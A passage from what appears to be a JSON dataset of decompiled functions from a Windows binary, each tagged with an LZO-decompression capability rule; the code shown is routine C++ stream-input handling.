iVar11;\n                if (piVar14 < piStack216) {\n                    piVar9[2] = piVar14 + 2;\n                    if (0 < in_stack_ffffff6c) {\n                        *piStack152 = 0;\n                    }\n                }\n                else {\n                    (**(*piVar9 + 0x28))();\n                    iVar11 = piStack208[1];\n                    if (0 < in_stack_ffffff6c) {\n                        *piStack152 = 0;\n                    }\n                }\n                goto joined_r0x0049e384;\n            }\n            if (0 < in_stack_ffffff6c) {\n                *piStack152 = 0;\n                uVar8 = 4;\n                goto code_r0x0049e0fd;\n            }\n            uVar8 = 4;\n        }\ncode_r0x0049e302:\n        if (iVar12 == 0) {\n            uVar8 = uVar8 | 4;\n        }\n    }\ncode_r0x0049e0fd:\n    fcn.004bc500(uVar8 | *(piStack208 + *(*piStack208 + -0xc) + 0x14));\n    return piStack212;\n}\n",
        "token_count": 4156
    },
    "0049e3d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049e3d0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_9h;\n    \n    in_ECX[1] = 0;\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0049dc90();\n    if (var_9h == '\\0') {\n        return;\n    }\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar1 = *(iVar4 + 0x78);\n    if (piVar1 != NULL) {\n        uVar2 = piVar1[2];\n        if ((piVar1[1] < uVar2) && (iVar3 = *(uVar2 - 2),  arg_8h == iVar3)) {\n            piVar1[2] = uVar2 - 2;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(arg_8h);\n        }\n        if (iVar3 != -1) {\n            return;\n        }\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    fcn.004bc500(*(iVar4 + 0x14) | 1);\n    return;\n}\n",
        "token_count": 356
    },
    "0049e4f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0049e4f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.0049dc90();\n    if (var_9h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        if (piVar1[2] == piVar1[3]) {\n            iVar2 = (**(*piVar1 + 0x1c))();\n        }\n        else {\n            iVar2 = piVar1[3] - piVar1[2] >> 1;\n        }\n        if (0 < iVar2) {\n            if (arg_ch < iVar2) {\n                iVar2 = arg_ch;\n            }\n            iVar2 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, iVar2);\n            in_ECX[1] = iVar2;\n            return iVar2;\n        }\n        if (iVar2 == -1) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 2);\n        }\n    }\n    return in_ECX[1];\n}\n",
        "token_count": 355
    },
    "0049e6f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049e6f0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1e] = 0;\n    *(in_ECX + 0x1f) = 0;\n    *(in_ECX + 0x7e) = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    *in_ECX = 0x52c1c4;\n    in_ECX[2] = 0x52c1d8;\n    in_ECX[1] = 0;\n    fcn.004bc380(arg_8h);\n    return;\n}\n",
        "token_count": 212
    },
    "0049e790": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0049e790(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1e] = 0;\n    *(param_1 + 0x1f) = 0;\n    *(param_1 + 0x7e) = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    *param_1 = 0x52c1c4;\n    param_1[2] = 0x52c1d8;\n    param_1[1] = 0;\n    fcn.004bc380(0);\n    return;\n}\n",
        "token_count": 201
    },
    "0049ebf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049ebf0(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t iVar8;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_06;\n    int32_t iVar9;\n    int32_t unaff_EDI;\n    ulong uVar10;\n    char cStack653;\n    int32_t in_stack_fffffd98;\n    int16_t *in_stack_fffffd9c;\n    int16_t iStack604;\n    uint uVar11;\n    char cStack537;\n    uint32_t uStack536;\n    uint uStack520;\n    int32_t iStack516;\n    int32_t iStack512;\n    uchar *puStack508;\n    int32_t *piStack504;\n    uint uStack500;\n    int32_t *piStack496;\n    uint uStack492;\n    int32_t iStack488;\n    uchar *puStack484;\n    uint uStack480;\n    char cStack453;\n    uint32_t uStack452;\n    uint uStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    uchar *puStack424;\n    int32_t *piStack420;\n    uint uStack416;\n    int32_t *piStack412;\n    uint uStack408;\n    int32_t iStack404;\n    uchar *puStack400;\n    uint uStack396;\n    char cStack369;\n    uint32_t uStack368;\n    uint uStack352;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar *puStack340;\n    int32_t *piStack336;\n    uint uStack332;\n    int32_t *piStack328;\n    uint uStack324;\n    int32_t iStack320;\n    uchar *puStack316;\n    uint uStack312;\n    char cStack285;\n    uint32_t uStack284;\n    uint uStack268;\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar *puStack256;\n    int32_t *piStack252;\n    uint uStack248;\n    int32_t *piStack244;\n    uint uStack240;\n    int32_t iStack236;\n    uchar *puStack232;\n    uint uStack228;\n    char cStack201;\n    uint32_t uStack200;\n    uint uStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t *piStack168;\n    uint uStack164;\n    int32_t *piStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uchar *puStack148;\n    uint uStack144;\n    char cStack117;\n    uint32_t uStack116;\n    uint uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uchar *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uStack72 = 0;\n    uStack80 = 0x49ec0e;\n    piStack76 = in_ECX;\n    fcn.0049dc90();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    stack0xffffffdc = 0;\n    iStack96 = *(*in_ECX + -0xc) + in_ECX;\n    if (*(iStack96 + 0x84) != NULL) {\n        piStack84 = *(iStack96 + 0x78);\n        puStack60 = &fcn.0049ebf0::var_1ch;\n        iStack64 = &fcn.0049ebf0::var_21h + 1;\n        piStack76 = NULL;\n        uStack72 = 0xffff;\n        uStack80 = 0xffff;\n        puStack88 = 0x49ec66;\n        iStack68 = iStack96;\n        (**(**(iStack96 + 0x84) + 0xc))();\n        *arg_8h = var_1ch;\ncode_r0x0049ec71:\n        if (stack0xffffffdc == 0) {\n            return in_ECX;\n        }\n        piStack84 = stack0xffffffdc | *(in_ECX + *(*in_ECX + -0xc) + 0x14);\n        puStack88 = 0x49ec96;\n        fcn.004bc500();\n        return in_ECX;\n    }\n    puStack88 = 0x49ecaa;\n    uVar10 = fcn.004bde60();\n    piStack84 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack88 = 0x49ecd4;\n        fcn.004c2e40();\n        iVar9 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack88 = 0x49ece8;\n            fcn.004c32d0();\n        }\n        puStack88 = 0x49eced;\n        in_ECX = fcn.004c32d0();\n    }\n    else {\n        puStack88 = 0x49ecb7;\n        fcn.004c2e40();\n        unaff_EDI = *(*in_ECX + -0xc) + in_ECX;\n        *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) | 1;\n        if ((*(unaff_EDI + 0x10) & 1) == 0) {\n            puStack88 = 0x49eccd;\n            fcn.004c2fb0();\n            goto code_r0x0049ec71;\n        }\n        puStack88 = 0x49ecf6;\n        fcn.004c32d0();\n    }\n    puStack88 = 0x49ecfb;\n    fcn.004c2fb0();\n    puStack88 = 0x49ed03;\n    piStack84 = in_ECX;\n    uStack100 = fcn.0043a8e0();\n    puStack88 = 0x49ed0a;\n    fcn.004c2fb0();\n    puStack88 = 0x49ed12;\n    piStack84 = uStack100;\n    fcn.0043a8e0();\n    uStack156 = 0;\n    uStack164 = 0x49c1ee;\n    piStack160 = extraout_ECX_06;\n    iStack92 = unaff_EDI;\n    puStack88 = &stack0xfffffffc;\n    fcn.0049dc90();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_06;\n    }\n    uStack116 = 0;\n    iStack180 = *(*extraout_ECX_06 + -0xc) + extraout_ECX_06;\n    if (*(iStack180 + 0x84) != NULL) {\n        piStack168 = *(iStack180 + 0x78);\n        uStack144 = uStack80;\n        puStack148 = &stack0xffffff8c;\n        piStack160 = NULL;\n        uStack156 = 0xffff;\n        uStack164 = 0xffff;\n        puStack172 = 0x49c246;\n        iStack152 = iStack180;\n        (**(**(iStack180 + 0x84) + 0x14))();\ncode_r0x0049c249:\n        if (uStack116 == 0) {\n            return extraout_ECX_06;\n        }\n        piStack168 = uStack116 | *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x14);\n        puStack172 = 0x49c272;\n        fcn.004bc500();\n        return extraout_ECX_06;\n    }\n    puStack172 = 0x49c286;\n    uVar10 = fcn.004bde60();\n    piStack168 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack172 = 0x49c2b0;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x49c2c4;\n            fcn.004c32d0();\n        }\n        puStack172 = 0x49c2c9;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack172 = 0x49c293;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x49c2a9;\n            fcn.004c2fb0();\n            goto code_r0x0049c249;\n        }\n        puStack172 = 0x49c2d2;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_06;\n    }\n    puStack172 = 0x49c2d7;\n    fcn.004c2fb0();\n    puStack172 = 0x49c2df;\n    piStack168 = piVar5;\n    uStack184 = fcn.0043a8e0();\n    puStack172 = 0x49c2e6;\n    fcn.004c2fb0();\n    puStack172 = 0x49c2ee;\n    piStack168 = uStack184;\n    fcn.0043a8e0();\n    uStack240 = 0;\n    uStack248 = 0x49c30e;\n    piStack244 = extraout_ECX;\n    iStack176 = unaff_EDI;\n    puStack172 = &stack0xffffffa8;\n    fcn.0049dc90();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    uStack200 = 0;\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        piStack252 = *(iStack264 + 0x78);\n        uStack228 = uStack164;\n        puStack232 = &stack0xffffff38;\n        piStack244 = NULL;\n        uStack240 = 0xffff;\n        uStack248 = 0xffff;\n        puStack256 = 0x49c366;\n        iStack236 = iStack264;\n        (**(**(iStack264 + 0x84) + 0xc))();\ncode_r0x0049c369:\n        if (uStack200 == 0) {\n            return extraout_ECX;\n        }\n        piStack252 = uStack200 | *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x14);\n        puStack256 = 0x49c392;\n        fcn.004bc500();\n        return extraout_ECX;\n    }\n    puStack256 = 0x49c3a6;\n    uVar10 = fcn.004bde60();\n    piStack252 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack256 = 0x49c3d0;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x49c3e4;\n            fcn.004c32d0();\n        }\n        puStack256 = 0x49c3e9;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack256 = 0x49c3b3;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x49c3c9;\n            fcn.004c2fb0();\n            goto code_r0x0049c369;\n        }\n        puStack256 = 0x49c3f2;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX;\n    }\n    puStack256 = 0x49c3f7;\n    fcn.004c2fb0();\n    puStack256 = 0x49c3ff;\n    piStack252 = piVar5;\n    uStack268 = fcn.0043a8e0();\n    puStack256 = 0x49c406;\n    fcn.004c2fb0();\n    puStack256 = 0x49c40e;\n    piStack252 = uStack268;\n    fcn.0043a8e0();\n    uStack324 = 0;\n    uStack332 = 0x49c42e;\n    piStack328 = extraout_ECX_00;\n    iStack260 = unaff_EDI;\n    puStack256 = &stack0xffffff54;\n    fcn.0049dc90();\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    uStack284 = 0;\n    iStack348 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iStack348 + 0x84) != NULL) {\n        piStack336 = *(iStack348 + 0x78);\n        uStack312 = uStack248;\n        puStack316 = &stack0xfffffee4;\n        piStack328 = NULL;\n        uStack324 = 0xffff;\n        uStack332 = 0xffff;\n        puStack340 = 0x49c486;\n        iStack320 = iStack348;\n        (**(**(iStack348 + 0x84) + 0x18))();\ncode_r0x0049c489:\n        if (uStack284 == 0) {\n            return extraout_ECX_00;\n        }\n        piStack336 = uStack284 | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14);\n        puStack340 = 0x49c4b2;\n        fcn.004bc500();\n        return extraout_ECX_00;\n    }\n    puStack340 = 0x49c4c6;\n    uVar10 = fcn.004bde60();\n    piStack336 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack340 = 0x49c4f0;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x49c504;\n            fcn.004c32d0();\n        }\n        puStack340 = 0x49c509;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack340 = 0x49c4d3;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x49c4e9;\n            fcn.004c2fb0();\n            goto code_r0x0049c489;\n        }\n        puStack340 = 0x49c512;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_00;\n    }\n    puStack340 = 0x49c517;\n    fcn.004c2fb0();\n    puStack340 = 0x49c51f;\n    piStack336 = piVar5;\n    uStack352 = fcn.0043a8e0();\n    puStack340 = 0x49c526;\n    fcn.004c2fb0();\n    puStack340 = 0x49c52e;\n    piStack336 = uStack352;\n    fcn.0043a8e0();\n    uStack408 = 0;\n    uStack416 = 0x49c54e;\n    piStack412 = extraout_ECX_01;\n    iStack344 = unaff_EDI;\n    puStack340 = &stack0xffffff00;\n    fcn.0049dc90();\n    if (cStack369 == '\\0') {\n        return extraout_ECX_01;\n    }\n    uStack368 = 0;\n    iStack432 = *(*extraout_ECX_01 + -0xc) + extraout_ECX_01;\n    if (*(iStack432 + 0x84) != NULL) {\n        piStack420 = *(iStack432 + 0x78);\n        uStack396 = uStack332;\n        puStack400 = &stack0xfffffe90;\n        piStack412 = NULL;\n        uStack408 = 0xffff;\n        uStack416 = 0xffff;\n        puStack424 = 0x49c5a6;\n        iStack404 = iStack432;\n        (**(**(iStack432 + 0x84) + 0x10))();\ncode_r0x0049c5a9:\n        if (uStack368 == 0) {\n            return extraout_ECX_01;\n        }\n        piStack420 = uStack368 | *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x14);\n        puStack424 = 0x49c5d2;\n        fcn.004bc500();\n        return extraout_ECX_01;\n    }\n    puStack424 = 0x49c5e6;\n    uVar10 = fcn.004bde60();\n    piStack420 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack424 = 0x49c610;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x49c624;\n            fcn.004c32d0();\n        }\n        puStack424 = 0x49c629;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack424 = 0x49c5f3;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x49c609;\n            fcn.004c2fb0();\n            goto code_r0x0049c5a9;\n        }\n        puStack424 = 0x49c632;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_01;\n    }\n    puStack424 = 0x49c637;\n    fcn.004c2fb0();\n    puStack424 = 0x49c63f;\n    piStack420 = piVar5;\n    uStack436 = fcn.0043a8e0();\n    puStack424 = 0x49c646;\n    fcn.004c2fb0();\n    puStack424 = 0x49c64e;\n    piStack420 = uStack436;\n    fcn.0043a8e0();\n    uStack492 = 0;\n    uStack500 = 0x49c66e;\n    piStack496 = extraout_ECX_02;\n    iStack428 = unaff_EDI;\n    puStack424 = &stack0xfffffeac;\n    fcn.0049dc90();\n    if (cStack453 == '\\0') {\n        return extraout_ECX_02;\n    }\n    uStack452 = 0;\n    iStack516 = *(*extraout_ECX_02 + -0xc) + extraout_ECX_02;\n    if (*(iStack516 + 0x84) != NULL) {\n        piStack504 = *(iStack516 + 0x78);\n        uStack480 = uStack416;\n        puStack484 = &stack0xfffffe3c;\n        piStack496 = NULL;\n        uStack492 = 0xffff;\n        uStack500 = 0xffff;\n        puStack508 = 0x49c6c6;\n        iStack488 = iStack516;\n        (**(**(iStack516 + 0x84) + 0x1c))();\ncode_r0x0049c6c9:\n        if (uStack452 == 0) {\n            return extraout_ECX_02;\n        }\n        piStack504 = uStack452 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14);\n        puStack508 = 0x49c6f2;\n        fcn.004bc500();\n        return extraout_ECX_02;\n    }\n    puStack508 = 0x49c706;\n    uVar10 = fcn.004bde60();\n    piStack504 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack508 = 0x49c730;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x49c744;\n            fcn.004c32d0();\n        }\n        puStack508 = 0x49c749;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack508 = 0x49c713;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x49c729;\n            fcn.004c2fb0();\n            goto code_r0x0049c6c9;\n        }\n        puStack508 = 0x49c752;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_02;\n    }\n    puStack508 = 0x49c757;\n    fcn.004c2fb0();\n    puStack508 = 0x49c75f;\n    piStack504 = piVar5;\n    uStack520 = fcn.0043a8e0();\n    puStack508 = 0x49c766;\n    fcn.004c2fb0();\n    puStack508 = 0x49c76e;\n    piStack504 = uStack520;\n    fcn.0043a8e0();\n    uVar11 = 0x49c78e;\n    iStack512 = unaff_EDI;\n    puStack508 = &stack0xfffffe58;\n    fcn.0049dc90(extraout_ECX_03, 0);\n    if (cStack537 == '\\0') {\n        return extraout_ECX_03;\n    }\n    uStack536 = 0;\n    iVar9 = *(*extraout_ECX_03 + -0xc) + extraout_ECX_03;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffff, 0, 0xffff, iVar9, &stack0xfffffde8, uStack500);\ncode_r0x0049c7e9:\n        if (uStack536 == 0) {\n            return extraout_ECX_03;\n        }\n        fcn.004bc500(uStack536 | *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x14));\n        return extraout_ECX_03;\n    }\n    uVar10 = fcn.004bde60();\n    if (uVar10 >> 0x20 == 1) {\n        fcn.004c2e40(uVar10);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar10);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x0049c7e9;\n        }\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_03;\n    }\n    fcn.004c2fb0();\n    uVar4 = fcn.0043a8e0(piVar5);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar4);\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x7c);\n    if (piVar5 != NULL) {\n        uVar2 = (**(*piVar5 + 0x28))(10);\n        piVar5 = fcn.0049c8e0(uVar4, uVar11, uVar2);\n        return piVar5;\n    }\n    fcn.004bde60();\n    extraout_ECX_05[1] = 0;\n    fcn.0049dc90(extraout_ECX_05, 1);\n    if (cStack653 == '\\0') {\n        iVar8 = extraout_ECX_05[1];\n    }\n    else {\n        piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x78);\n        piVar6 = piVar5[2];\n        if (piVar6 <= piVar5[3] && piVar5[3] != piVar6) goto code_r0x0049c9a7;\ncode_r0x0049c951:\n        iVar3 = (**(*piVar5 + 0x24))();\n        iVar8 = extraout_ECX_05[1];\n        iVar9 = iVar8 + 1;\n        piVar6 = in_stack_fffffd9c;\n        if (iVar9 < in_stack_fffffd98) {\n            do {\n                if (iVar3 == -1) {\n                    uVar7 = 2;\ncode_r0x0049ca92:\n                    if (0 < in_stack_fffffd98) {\n                        *piVar6 = 0;\n                    }\n                    if (iVar8 == 0) {\ncode_r0x0049ca0d:\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_05;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                if (iVar3 == iStack604) {\n                    uVar7 = 0;\n                    goto code_r0x0049ca92;\n                }\n                in_stack_fffffd9c = piVar6 + 1;\n                *piVar6 = iVar3;\n                extraout_ECX_05[1] = iVar9;\n                piVar6 = piVar5[2];\n                if (piVar6 < piVar5[3]) {\n                    iVar3 = *piVar6;\n                    piVar5[2] = piVar6 + 1;\n                    if (iVar3 != -1) goto code_r0x0049c99f;\ncode_r0x0049c9f0:\n                    iVar9 = extraout_ECX_05[1];\n                    if (in_stack_fffffd98 < 1) {\n                        if (iVar9 != 0) goto code_r0x0049c983;\n                        uVar7 = 6;\n                    }\n                    else {\n                        *in_stack_fffffd9c = 0;\n                        uVar7 = 2;\n                        if (iVar9 == 0) goto code_r0x0049ca0d;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                iVar3 = (**(*piVar5 + 0x28))();\n                if (iVar3 == -1) goto code_r0x0049c9f0;\ncode_r0x0049c99f:\n                piVar6 = piVar5[2];\n                if (piVar5[3] <= piVar6) goto code_r0x0049c951;\ncode_r0x0049c9a7:\n                iVar8 = extraout_ECX_05[1];\n                iVar3 = *piVar6;\n                iVar9 = iVar8 + 1;\n                piVar6 = in_stack_fffffd9c;\n                if (in_stack_fffffd98 <= iVar9) break;\n            } while( true );\n        }\n        if (iVar3 == -1) {\n            if (0 < in_stack_fffffd98) {\n                *in_stack_fffffd9c = 0;\n            }\n            uVar7 = 6;\n            if (iVar8 != 0) {\ncode_r0x0049c983:\n                uVar7 = 2;\n            }\n            goto code_r0x0049ca65;\n        }\n    }\n    if (0 < in_stack_fffffd98) {\n        *in_stack_fffffd9c = 0;\n    }\n    if (iVar8 != 0) {\n        return extraout_ECX_05;\n    }\n    uVar7 = 4;\ncode_r0x0049ca65:\n    fcn.004bc500(uVar7 | *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x14));\n    return extraout_ECX_05;\n}\n",
        "token_count": 7468
    },
    "0049ed50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0049c6e0)\n// WARNING: Removing unreachable block (ram,0x0049c5c0)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049ed50(ushort *arg_8h)\n\n{\n    uint32_t *puVar1;\n    bool bVar2;\n    ushort uVar3;\n    int16_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t iVar9;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_03;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t iVar10;\n    ulong uVar11;\n    char cStack401;\n    int32_t in_stack_fffffe94;\n    int16_t *in_stack_fffffe98;\n    int16_t iStack352;\n    uint uVar12;\n    char cStack285;\n    uint32_t auStack284 [4];\n    uint uStack268;\n    int32_t iStack264;\n    char cStack201;\n    char cStack117;\n    uint var_21h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0049dc90();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    bVar2 = false;\n    piVar6 = *(in_ECX + *(*in_ECX + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0xc))();\n        if (var_1ch < -0x8000) {\n            bVar2 = true;\n            *arg_8h = 0x8000;\n        }\n        else {\n            if (0x7fff < var_1ch) {\n                *arg_8h = 0x7fff;\n                goto code_r0x0049ee1d;\n            }\n            *arg_8h = var_1ch;\n        }\ncode_r0x0049edec:\n        if (!bVar2) {\n            return in_ECX;\n        }\ncode_r0x0049ee1d:\n        fcn.004bc500();\n        return in_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_01 == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x0049edec;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    